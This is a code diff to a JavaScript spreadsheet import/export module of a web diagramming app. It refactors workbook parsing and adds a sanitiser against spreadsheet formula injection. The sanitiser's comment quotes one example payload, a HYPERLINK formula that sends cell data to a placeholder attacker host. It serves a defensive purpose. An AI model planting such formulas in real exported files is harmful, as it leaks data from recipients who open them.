@@ -113,19 +113,15 @@ window.CanvasApp.XlsxIO = (function () {
             return;
         }
         if (State.hasUnsavedChanges && State.hasUnsavedChanges()) {
-            var App = window.CanvasApp.App;
-            var doOpen = function () { actuallyOpenImportModal(); };
-            if (App && App.confirmDialog) {
-                App.confirmDialog({
-                    title: 'Ungespeicherte Änderungen verwerfen?',
-                    body:  'Beim Importieren gehen alle ungespeicherten Änderungen verloren.',
-                    confirmText: 'Fortfahren',
-                    cancelText:  'Abbrechen',
-                    danger: true
-                }).then(function (ok) { if (ok) doOpen(); });
-            } else {
-                if (window.confirm('Ungespeicherte Änderungen verwerfen?')) doOpen();
-            }
+            // App.confirmDialog is guaranteed by the bootstrap load-order
+            // check; no native-confirm fallback needed.
+            window.CanvasApp.App.confirmDialog({
+                title: 'Ungespeicherte Änderungen verwerfen?',
+                body:  'Beim Importieren gehen alle ungespeicherten Änderungen verloren.',
+                confirmText: 'Fortfahren',
+                cancelText:  'Abbrechen',
+                danger: true
+            }).then(function (ok) { if (ok) actuallyOpenImportModal(); });
         } else {
             actuallyOpenImportModal();
         }
@@ -483,11 +479,7 @@ window.CanvasApp.XlsxIO = (function () {
             Canvas.fitToScreen();
         }
         // Let the layout settle before opening the print dialog.
-        requestAnimationFrame(function () {
-            requestAnimationFrame(function () {
-                window.print();
-            });
-        });
+        window.CanvasApp.Util.afterLayout(function () { window.print(); });
     }
 
     function exportXlsx() {
@@ -623,11 +615,40 @@ window.CanvasApp.XlsxIO = (function () {
         return function (n) { return !!s[n.type]; };
     }
 
+    /**
+     * Sanitise a string against Excel/LibreOffice/Numbers formula injection.
+     * Cells whose first non-whitespace character is one of `= + - @ \t \r`
+     * are interpreted as a formula by the spreadsheet app — so a label
+     * like `=HYPERLINK("https://attacker/?d="&A1,"open")` saved into an
+     * exported workbook will run on the recipient's machine when the file
+     * is opened, exfiltrating data or phishing them.
+     *
+     * The well-known mitigation is to prefix the cell value with a single
+     * apostrophe — Excel/LibreOffice strip it on display but treat the
+     * remainder as text, never as a formula. We apply this only to the
+     * first character to avoid mangling labels that contain `=` mid-word.
+     */
+    var FORMULA_TRIGGER_RE = /^[=+\-@\t\r]/;
+    function safeCell(v) {
+        if (typeof v !== 'string' || !v) return v;
+        return FORMULA_TRIGGER_RE.test(v) ? "'" + v : v;
+    }
+
+    /**
+     * Walk a row object and apply safeCell to every string field. Object
+     * shape preserved so json_to_sheet still finds its headers.
+     */
+    function safeRow(row) {
+        var out = {};
+        Object.keys(row).forEach(function (k) { out[k] = safeCell(row[k]); });
+        return out;
+    }
+
     function sheetFromRows(rows, headers) {
         if (!rows.length) {
             return XLSX.utils.aoa_to_sheet([headers]);
         }
-        return XLSX.utils.json_to_sheet(rows, { header: headers });
+        return XLSX.utils.json_to_sheet(rows.map(safeRow), { header: headers });
     }
 
     // ---- Import --------------------------------------------------------
@@ -647,13 +668,49 @@ window.CanvasApp.XlsxIO = (function () {
         return null;
     }
 
+    /**
+     * Parse a SheetJS workbook into the frontend's `{nodes, edges, sets}`
+     * shape. Decomposed into per-section helpers so each round-trip-loss
+     * concern lives next to the code that produces it; mirrors the
+     * structure of state.js's serializeDraftToPayload.
+     */
     function parseWorkbook(wb) {
-        // Sheet name + the implicit type rows on it should default to. The
-        // current export writes one merged `distribution` sheet (rows carry
-        // their own `type`) and a separate `code_list` sheet. Pre-rename
-        // exports kept four typed sheets — read those as a fallback so older
-        // exports still load. First match per id wins, so the new sheets are
-        // listed before the legacy ones.
+        // Section 1: distribution + codelist nodes (typed sheets).
+        var nodes = parseDistributionSheets(wb);
+        // Section 2: pset registry (with in-memory fallback).
+        var sets = parsePsetSheet(wb);
+        var knownSetIds = Object.create(null);
+        sets.forEach(function (s) { knownSetIds[s.id] = true; });
+        // Section 3: per-node SAP source structures (rare, optional).
+        var ssByNode = parseSourceStructureSheet(wb);
+        // Section 4: attributes — wired onto the matching node by id.
+        var colsByNode = parseAttributeSheet(wb, knownSetIds);
+        // Section 5: inter-node flow edges.
+        var edges = parseEdgeSheet(wb);
+
+        // Stitch attributes / source structures onto their nodes.
+        nodes.forEach(function (n) {
+            n.columns = colsByNode[n.id] || [];
+            if (ssByNode[n.id]) {
+                n.sourceStructures = ssByNode[n.id];
+                if (!n.groupBy) n.groupBy = 'sourceStructure';
+            }
+        });
+
+        return { nodes: nodes, edges: edges, sets: sets };
+    }
+
+    /**
+     * Section 1: distribution + codelist nodes. The current export writes
+     * one merged `distribution` sheet (rows carry their own `type`) and a
+     * separate `code_list` sheet. Pre-rename exports kept four typed sheets
+     * (Tables / APIs / Files / ValueLists) — we still read those as a
+     * fallback so older exports load. First match per id wins so the new
+     * sheets are listed before the legacy ones.
+     *
+     * Final fallback: a single "Nodes" sheet (very old export shape).
+     */
+    function parseDistributionSheets(wb) {
         var TYPED_SHEETS = [
             'distribution',
             'code_list',
@@ -683,7 +740,8 @@ window.CanvasApp.XlsxIO = (function () {
             console.warn('Import: pre-rename sheet names detected (Tables / APIs / Files / ValueLists). Workbook will be re-emitted with the current names (distribution / code_list) on the next export.');
         }
 
-        // Legacy fallback — if no typed sheets matched but a Nodes sheet exists
+        // Legacy-legacy fallback — single "Nodes" sheet from the very early
+        // export shape. Only consulted when no typed sheet matched.
         if (!nodes.length) {
             var legacy = findSheet(wb, ['Nodes', 'nodes']);
             if (legacy) {
@@ -695,11 +753,17 @@ window.CanvasApp.XlsxIO = (function () {
                 });
             }
         }
+        return nodes;
+    }
 
-        // PropertySets — global registry. Authoritative on import; columns
-        // reference these by id. If the sheet is missing or empty, fall
-        // back to the in-memory registry so the import doesn't strand
-        // existing setIds.
+    /**
+     * Section 2: PropertySets registry. Authoritative on import — column
+     * `set_id` cells reference these by id. When the sheet is missing or
+     * empty, fall back to the in-memory registry so the import doesn't
+     * strand existing references; an XLSX with attributes-but-no-psets is
+     * common (user only edited columns).
+     */
+    function parsePsetSheet(wb) {
         var sets = [];
         var setsSheet = findSheet(wb, PSET_SHEET_ALIASES);
         if (setsSheet) {
@@ -715,57 +779,68 @@ window.CanvasApp.XlsxIO = (function () {
                 });
         }
         if (!sets.length) sets = State.getSets().slice();
-        var knownSetIds = Object.create(null);
-        sets.forEach(function (s) { knownSetIds[s.id] = true; });
+        return sets;
+    }
 
-        // SourceStructures — per-node SAP-substructure registry.
-        var ssByNode = {};
+    /**
+     * Section 3: per-node SAP source-structure registry. Optional — only
+     * the SAP API node uses this in practice. Returns a map of
+     * `node_id → [{ id, label }]`.
+     */
+    function parseSourceStructureSheet(wb) {
+        var byNode = {};
         var ssSheet = findSheet(wb, SOURCE_STRUCTURE_ALIASES);
-        if (ssSheet) {
-            XLSX.utils.sheet_to_json(ssSheet, { defval: '' }).forEach(function (r) {
-                if (!r.node_id || !r.key) return;
-                (ssByNode[r.node_id] = ssByNode[r.node_id] || []).push({
-                    id: String(r.key).trim(),
-                    label: String(r.label || '').trim()
-                });
+        if (!ssSheet) return byNode;
+        XLSX.utils.sheet_to_json(ssSheet, { defval: '' }).forEach(function (r) {
+            if (!r.node_id || !r.key) return;
+            (byNode[r.node_id] = byNode[r.node_id] || []).push({
+                id: String(r.key).trim(),
+                label: String(r.label || '').trim()
             });
-        }
+        });
+        return byNode;
+    }
 
-        // Attributes — canonical headers are snake_case (`set_id`,
-        // `source_structure`) to match the rest of the Excel schema. We
-        // still accept camelCase (`setId`, `sourceStructure`) for files
-        // exported from older builds or hand-edited by users coming from
-        // the JSON shape, but warn so the user knows the workbook will
-        // normalise on the next export.
+    /**
+     * Section 4: attributes. Canonical headers are snake_case (`set_id`,
+     * `source_structure`); camelCase (`setId`, `sourceStructure`) is
+     * accepted from older exports / hand-edited workbooks but the user
+     * gets a warning that the next export will normalise. Returns a
+     * map of `node_id → [column, …]`. References to unknown setIds are
+     * dropped (rather than poisoning state) and reported in console.
+     */
+    function parseAttributeSheet(wb, knownSetIds) {
+        var byNode = {};
         var colsSheet = findSheet(wb, ATTRIBUTE_SHEET_ALIASES);
-        var colsByNode = {};
+        if (!colsSheet) return byNode;
+
         var unknownSetIds = Object.create(null);
         var sawCamelHeaders = false;
-        if (colsSheet) {
-            XLSX.utils.sheet_to_json(colsSheet, { defval: '' }).forEach(function (r) {
-                if (!r.node_id) return;
-                var setIdSnake = String(r.set_id || '').trim();
-                var setIdCamel = String(r.setId  || '').trim();
-                if (setIdCamel && !setIdSnake) sawCamelHeaders = true;
-                var setId = setIdSnake || setIdCamel;
-                if (setId && !knownSetIds[setId]) {
-                    unknownSetIds[setId] = (unknownSetIds[setId] || 0) + 1;
-                    setId = ''; // drop the bad reference rather than poisoning state
-                }
-                var col = {
-                    name: String(r.name || ''),
-                    type: String(r.type || ''),
-                    key: String(r.key || '')
-                };
-                if (setId) col.setId = setId;
-                var ssSnake = String(r.source_structure || '').trim();
-                var ssCamel = String(r.sourceStructure  || '').trim();
-                if (ssCamel && !ssSnake) sawCamelHeaders = true;
-                var ss = ssSnake || ssCamel;
-                if (ss) col.sourceStructure = ss;
-                (colsByNode[r.node_id] = colsByNode[r.node_id] || []).push(col);
-            });
-        }
+
+        XLSX.utils.sheet_to_json(colsSheet, { defval: '' }).forEach(function (r) {
+            if (!r.node_id) return;
+            var setIdSnake = String(r.set_id || '').trim();
+            var setIdCamel = String(r.setId  || '').trim();
+            if (setIdCamel && !setIdSnake) sawCamelHeaders = true;
+            var setId = setIdSnake || setIdCamel;
+            if (setId && !knownSetIds[setId]) {
+                unknownSetIds[setId] = (unknownSetIds[setId] || 0) + 1;
+                setId = ''; // drop bad ref rather than poisoning state
+            }
+            var col = {
+                name: String(r.name || ''),
+                type: String(r.type || ''),
+                key:  String(r.key  || '')
+            };
+            if (setId) col.setId = setId;
+            var ssSnake = String(r.source_structure || '').trim();
+            var ssCamel = String(r.sourceStructure  || '').trim();
+            if (ssCamel && !ssSnake) sawCamelHeaders = true;
+            var ss = ssSnake || ssCamel;
+            if (ss) col.sourceStructure = ss;
+            (byNode[r.node_id] = byNode[r.node_id] || []).push(col);
+        });
+
         if (Object.keys(unknownSetIds).length) {
             console.warn('Import: unknown setIds (dropped on the affected columns):', unknownSetIds);
         }
@@ -775,33 +850,26 @@ window.CanvasApp.XlsxIO = (function () {
             // got bitten by, so make sure they see it before re-exporting.
             toast('Hinweis: Spaltennamen "setId"/"sourceStructure" werden beim Export zu "set_id"/"source_structure" umbenannt.', 'success');
         }
+        return byNode;
+    }
 
-        // Wire columns + per-node sourceStructures onto each node.
-        nodes.forEach(function (n) {
-            n.columns = colsByNode[n.id] || [];
-            if (ssByNode[n.id]) {
-                n.sourceStructures = ssByNode[n.id];
-                if (!n.groupBy) n.groupBy = 'sourceStructure';
-            }
-        });
-
-        // edge sheet (with pre-rename fallbacks).
+    /**
+     * Section 5: inter-node `flows_into` edges. Pre-rename fallbacks live
+     * in EDGE_SHEET_ALIASES.
+     */
+    function parseEdgeSheet(wb) {
         var edgesSheet = findSheet(wb, EDGE_SHEET_ALIASES);
-        var edges = [];
-        if (edgesSheet) {
-            edges = XLSX.utils.sheet_to_json(edgesSheet, { defval: '' })
-                .filter(function (r) { return r.from && r.to; })
-                .map(function (r, i) {
-                    return {
-                        id: String(r.id || ('e' + i)),
-                        from: String(r.from),
-                        to: String(r.to),
-                        label: String(r.label || '')
-                    };
-                });
-        }
-
-        return { nodes: nodes, edges: edges, sets: sets };
+        if (!edgesSheet) return [];
+        return XLSX.utils.sheet_to_json(edgesSheet, { defval: '' })
+            .filter(function (r) { return r.from && r.to; })
+            .map(function (r, i) {
+                return {
+                    id:    String(r.id || ('e' + i)),
+                    from:  String(r.from),
+                    to:    String(r.to),
+                    label: String(r.label || '')
+                };
+            });
     }
 
     function rowToNode(r, defaultType) {
@@ -853,11 +921,7 @@ window.CanvasApp.XlsxIO = (function () {
         }
     }
 
-    function escapeHtml(s) {
-        return String(s == null ? '' : s)
-            .replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;')
-            .replace(/"/g, '&quot;').replace(/'/g, '&#39;');
-    }
+    var escapeHtml = window.CanvasApp.Util.escapeHtml;
 
     return { init: init, exportXlsx: exportXlsx, exportJson: exportJson };
 })();
